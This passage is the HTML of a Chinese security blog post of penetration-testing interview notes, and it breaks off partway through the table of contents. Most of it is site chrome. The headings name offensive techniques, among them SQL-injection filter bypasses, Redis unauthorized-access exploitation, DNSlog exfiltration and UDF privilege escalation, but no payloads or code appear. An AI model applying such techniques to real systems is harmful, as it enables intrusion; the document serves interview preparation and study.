<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>面试整理 | J3fffff&#39;s Blog</title><meta name="description" content="基础知识  数据结构与算法  树的遍历 树的一些概念：   度：节点的度就是孩子的个数，树的度就是最大的度   深度（自上往下）、高度（自下往上）、层次（根节点为第一层，自上往下）   有序（左右孩子不可互换）、无序（可互换）   满二叉树（最后一排也是满的），平衡二叉树（任意节点的高度不超过1），完全二叉树（必须有左孩子才能有右孩子）   一些公式：  总结点数 &#x3D; 所有节点度的和 + 1 总"><meta property="og:type" content="article"><meta property="og:title" content="面试整理"><meta property="og:url" content="https://j3f5.github.io/articles/2023/08/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/index.html"><meta property="og:site_name" content="J3fffff&#39;s Blog"><meta property="og:description" content="基础知识  数据结构与算法  树的遍历 树的一些概念：   度：节点的度就是孩子的个数，树的度就是最大的度   深度（自上往下）、高度（自下往上）、层次（根节点为第一层，自上往下）   有序（左右孩子不可互换）、无序（可互换）   满二叉树（最后一排也是满的），平衡二叉树（任意节点的高度不超过1），完全二叉树（必须有左孩子才能有右孩子）   一些公式：  总结点数 &#x3D; 所有节点度的和 + 1 总"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230913102846918.png"><meta property="og:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230913104657807.png"><meta property="og:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/SQL%E6%B3%A8%E5%85%A5.png"><meta property="og:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/XSSCORSJSONPCSP.png"><meta property="og:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/CSRFSSRFXXE.png"><meta property="og:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8C%85%E5%90%AB%E8%AF%BB%E5%8F%96%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A.png"><meta property="og:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png"><meta property="og:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80.png"><meta property="og:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/6d50a4d95030412fafc05904c6f6bbad.png"><meta property="og:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/Web%E5%BA%94%E7%94%A8%E6%8C%87%E7%BA%B9%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF.png"><meta property="og:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E4%BA%8C.png"><meta property="og:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230831195842819.png"><meta property="og:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230612104714733.png"><meta property="og:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230831215459652.png"><meta property="article:published_time" content="2023-08-10T01:27:17.000Z"><meta property="article:modified_time" content="2023-08-20T01:27:17.000Z"><meta property="article:author" content="Jeff"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://j3f5.github.io/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230913102846918.png"><link rel="canonical" href="https://j3f5.github.io/articles/2023/08/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/index.html"><link rel="alternate" href="/atom.xml" title="J3fffff&#39;s Blog" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css">   <link rel="stylesheet" href="/css/theme/monokai-hook.css"><link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet"><meta name="generator" content="Hexo 6.3.0"></head><body class="main-center theme-purple" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/j3f5" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">妄想星空</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">Web Pentestor</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Guangzhou, China</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">首页</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">归档</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">分类</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">标签</span></a></li><li class="menu-item menu-item-about"><a href="/about"><i class="icon icon-cup-fill"></i> <span class="menu-title">关于</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/j3f5" target="_blank" title="Github"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss"><i class="icon icon-rss"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">公告</h3><div class="widget-body"><div id="board"><div class="content"><p>欢迎交流与分享经验!</p></div></div></div></div><div class="widget"><h3 class="widget-title">分类</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">JAVA安全基础</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/">渗透测试基础</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/">开发基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%89%93%E9%9D%B6/">打靶</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/">渗透测试基础</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/">车联网基础</a><span class="category-list-count">4</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签</h3><div class="widget-body"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CAN/" rel="tag">CAN</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JWT/" rel="tag">JWT</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/" rel="tag">XXE</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/waf%E7%BB%95%E8%BF%87/" rel="tag">waf绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/" rel="tag">业务逻辑</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8A%AB%E6%8C%81/" rel="tag">劫持</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%8F%E8%AE%AE/" rel="tag">协议</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" rel="tag">博客搭建</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/" rel="tag">审计技巧</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/" rel="tag">整体流程</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" rel="tag">文件读取</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag">权限提升</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/" rel="tag">渗透技巧</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/" rel="tag">漏洞发现</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A0%B4%E8%A7%A3/" rel="tag">破解</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%8A%E6%96%AD/" rel="tag">诊断</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E5%9F%9F/" rel="tag">跨域</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/" rel="tag">车联网标准</a><span class="tag-list-count">1</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签云</h3><div class="widget-body tagcloud"><a href="/tags/CAN/" style="font-size:13px">CAN</a> <a href="/tags/CSRF/" style="font-size:13.33px">CSRF</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/RCE/" style="font-size:13.33px">RCE</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/XSS/" style="font-size:13.67px">XSS</a> <a href="/tags/XXE/" style="font-size:13.33px">XXE</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size:14px">sql注入</a> <a href="/tags/waf%E7%BB%95%E8%BF%87/" style="font-size:13px">waf绕过</a> <a href="/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/" style="font-size:13px">业务逻辑</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">内网</a> <a href="/tags/%E5%8A%AB%E6%8C%81/" style="font-size:13px">劫持</a> <a href="/tags/%E5%8D%8F%E8%AE%AE/" style="font-size:13px">协议</a> <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" style="font-size:13px">博客搭建</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/" style="font-size:13px">审计技巧</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">提权</a> <a href="/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/" style="font-size:13.33px">整体流程</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13.33px">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size:13px">文件包含</a> <a href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" style="font-size:13px">文件读取</a> <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" style="font-size:13.33px">权限提升</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/" style="font-size:13px">渗透技巧</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/" style="font-size:13px">漏洞发现</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" style="font-size:13.33px">漏洞扫描</a> <a href="/tags/%E7%A0%B4%E8%A7%A3/" style="font-size:13px">破解</a> <a href="/tags/%E8%AF%8A%E6%96%AD/" style="font-size:13px">诊断</a> <a href="/tags/%E8%B7%A8%E5%9F%9F/" style="font-size:13px">跨域</a> <a href="/tags/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/" style="font-size:13px">车联网标准</a></div></div><div class="widget"><h3 class="widget-title">归档</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">八月 2023</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">七月 2023</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">六月 2023</a><span class="archive-list-count">22</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">13</span></li></ul></div></div><div class="widget"><h3 class="widget-title">最新文章</h3><div class="widget-body"><ul class="recent-post-list list-unstyled"><li><div class="item-thumb"><a href="/articles/2023/08/14/NTLM-relay%E5%A4%8D%E7%8E%B0/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/08/14/NTLM-relay%E5%A4%8D%E7%8E%B0/" class="title">NTLM-relay复现</a></p><p class="item-date"><time datetime="2023-08-14T07:55:16.000Z" itemprop="datePublished">2023-08-14</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/08/14/relay%E5%A4%8D%E7%8E%B0/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/08/14/relay%E5%A4%8D%E7%8E%B0/" class="title">relay复现</a></p><p class="item-date"><time datetime="2023-08-14T07:55:03.000Z" itemprop="datePublished">2023-08-14</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/08/14/PTT%E4%B8%8EMS14-068/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/08/14/PTT%E4%B8%8EMS14-068/" class="title">PTT与MS14-068</a></p><p class="item-date"><time datetime="2023-08-14T07:09:17.000Z" itemprop="datePublished">2023-08-14</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/08/14/MS14-068%E5%A4%8D%E7%8E%B0/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/08/14/MS14-068%E5%A4%8D%E7%8E%B0/" class="title">MS14-068复现</a></p><p class="item-date"><time datetime="2023-08-14T06:10:12.000Z" itemprop="datePublished">2023-08-14</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/08/11/BypassUAC%E6%8F%90%E6%9D%83/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/08/11/BypassUAC%E6%8F%90%E6%9D%83/" class="title">BypassUAC提权</a></p><p class="item-date"><time datetime="2023-08-11T01:13:32.000Z" itemprop="datePublished">2023-08-11</time></p></div></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">数据结构与算法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">树的遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E5%BA%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">排序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.2.</span> <span class="toc-text">操作系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.2.1.</span> <span class="toc-text">虚拟内存是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E7%AB%AF%E5%BA%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E5%BA%8F%E7%9A%84%E5%8C%BA%E5%88%AB%E7%8E%B0%E5%9C%A8x64%E7%A8%8B%E5%BA%8F%E9%83%BD%E6%98%AF%E5%A4%A7%E7%AB%AF%E5%BA%8F%E8%BF%98%E6%98%AF%E5%B0%8F%E7%AB%AF%E5%BA%8Fx86%E5%91%A2"><span class="toc-number">1.2.2.</span> <span class="toc-text">大端序和小端序的区别？现在X64程序都是大端序还是小端序，X86呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#new%E5%87%BA%E6%9D%A5%E7%9A%84%E5%8F%98%E9%87%8F%E6%94%BE%E5%9C%A8%E5%A0%86%E8%BF%98%E6%98%AF%E6%A0%88%E5%A6%82%E6%9E%9Cnew%E5%87%BA%E6%9D%A5%E6%B2%A1%E6%9C%89free%E4%BC%9A%E6%9C%89%E4%BB%80%E4%B9%88%E5%8D%B1%E9%99%A9"><span class="toc-number">1.2.3.</span> <span class="toc-text">new出来的变量放在堆还是栈？如果new出来没有free，会有什么危险？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C"><span class="toc-number">1.3.</span> <span class="toc-text">网络</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81"><span class="toc-number">1.3.1.</span> <span class="toc-text">子网掩码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%86%85%E7%BD%91%E6%AE%B5%E6%9C%89%E5%93%AA%E4%BA%9B%E4%BB%96%E4%BB%AC%E7%9A%84%E6%8E%A9%E7%A0%81%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.3.2.</span> <span class="toc-text">常见的内网段有哪些，他们的掩码是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E4%B8%AA%E5%8D%8F%E8%AE%AE%E5%B1%82osi-tcpip"><span class="toc-number">1.3.3.</span> <span class="toc-text">各个协议层OSI TCP&#x2F;IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcp%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B-%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B"><span class="toc-number">1.3.4.</span> <span class="toc-text">TCP三次握手、四次挥手</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.4.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F%E5%92%8C%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F"><span class="toc-number">1.4.1.</span> <span class="toc-text">浏览器解析顺序和解码顺序</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">解析顺序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">解码顺序</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#top10"><span class="toc-number">2.</span> <span class="toc-text">TOP10</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86-%E5%8D%B1%E5%AE%B3-%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E8%BF%99%E4%B8%AA%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.1.</span> <span class="toc-text">SQL注入的原理、危害、修复方式？以及如何发现这个是否存在sql注入？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mybatis%E9%A2%84%E7%BC%96%E8%AF%91%E6%98%AF%E6%80%8E%E4%B9%88%E5%81%9A%E7%9A%84%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">2.1.2.</span> <span class="toc-text">Mybatis预编译是怎么做的？怎么绕过预编译？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E5%9E%8B%E7%9B%B2%E6%B3%A8%E5%92%8C%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%E5%90%97%E6%80%8E%E4%B9%88%E5%86%99%E8%84%9A%E6%9C%AC"><span class="toc-number">2.1.3.</span> <span class="toc-text">时间型盲注和布尔型盲注有什么区别吗？怎么写脚本？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%9A%84sql%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87limit"><span class="toc-number">2.1.4.</span> <span class="toc-text">过滤逗号的SQL注入如何绕过（limit）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.5.</span> <span class="toc-text">redis未授权漏洞的利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">2.1.6.</span> <span class="toc-text">单引号被过滤了怎么办</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E4%B8%80%E4%B8%AA%E5%92%8C%E4%B8%A4%E4%B8%AA"><span class="toc-number">2.1.7.</span> <span class="toc-text">mysql一个@和两个@@</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep%E8%A2%AB%E7%A6%81%E6%AD%A2%E5%90%8E%E6%80%8E%E4%B9%88%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.8.</span> <span class="toc-text">sleep被禁止后怎么进行sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E5%88%A9%E7%94%A8dnslogmysql%E4%B8%8B%E5%88%A9%E7%94%A8%E4%BB%80%E4%B9%88%E6%9E%84%E9%80%A0%E4%BB%A3%E7%A0%81mssql%E4%B8%8B%E5%8F%88%E5%A6%82%E4%BD%95"><span class="toc-number">2.1.9.</span> <span class="toc-text">sql注入无回显的情况下，利用DNSlog，mysql下利用什么构造代码？mssql下又如何？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">2.1.10.</span> <span class="toc-text">宽字节注入漏洞原理、利用方式及修复方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BA%86%E8%A7%A3%E8%BF%87"><span class="toc-number">2.1.11.</span> <span class="toc-text">UDF提权有没有了解过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 